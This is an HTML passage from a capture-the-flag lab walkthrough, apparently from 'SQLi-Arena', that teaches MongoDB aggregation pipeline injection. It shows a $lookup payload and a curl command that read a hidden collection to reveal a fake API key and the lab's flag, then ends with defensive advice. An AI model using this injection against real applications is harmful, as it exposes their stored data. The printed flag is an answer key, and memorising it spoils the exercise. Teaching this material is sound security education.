<h4>Step 1: Explore Normal Functionality</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Pipeline Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pipeline: </span>[{"$sort": {"price": 1}}]<br><br>
        <span class="prompt">Output:</span><br>
        HDMI Cable ($12.99), Wireless Mouse ($25.99), Monitor Stand ($35.50),<br>
        USB Keyboard ($45.00), Laptop Bag ($55.00), Webcam HD ($79.99)
    </div>
</div>

<h4>Step 2: Inject $lookup Stage</h4>
<p>
    The application accepts a raw JSON pipeline via the <code>pipeline</code> parameter.
    Use <code>$lookup</code> to access the hidden <code>lab5_secret_analytics</code> collection
    and join its data into the result set.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: $lookup Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pipeline: </span>[<br>
        &nbsp;&nbsp;{"$lookup": {"from": "lab5_secret_analytics", "pipeline": [], "as": "secrets"}},<br>
        &nbsp;&nbsp;{"$limit": 1}<br>
        ]<br><br>
        <span class="prompt">Output (secrets field):</span><br>
        <strong>_id:</strong> 1: <strong>key:</strong> api_key: <strong>value:</strong> sk-nosql-12345<br>
        <strong>_id:</strong> 2: <strong>key:</strong> flag: <strong>value:</strong> <strong>FLAG{mg_4ggr3g4t3_p1p3l1n3}</strong><br>
        <strong>_id:</strong> 3: <strong>key:</strong> debug_mode: <strong>value:</strong> false<br>
        <strong>_id:</strong> 4: <strong>key:</strong> internal_note: <strong>value:</strong> Pipeline injection allows cross-collection access
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_4ggr3g4t3_p1p3l1n3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab5" \<br> --data-urlencode 'pipeline=[{"$lookup":{"from":"lab5_secret_analytics","pipeline":[],"as":"secrets"}},{"$limit":1}]'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MongoDB's aggregation pipeline includes powerful stages like
    <code>$lookup</code> (cross-collection joins), <code>$merge</code> (write to other collections),
    <code>$out</code> (replace collections), and <code>$graphLookup</code> (recursive joins).
    If an application accepts user-controlled pipeline stages, attackers can access any collection
    in the database. Defense: never accept raw pipeline JSON from users. Whitelist allowed stages
    and validate all parameters. Use MongoDB Atlas Data API with role-based access controls.
</div>
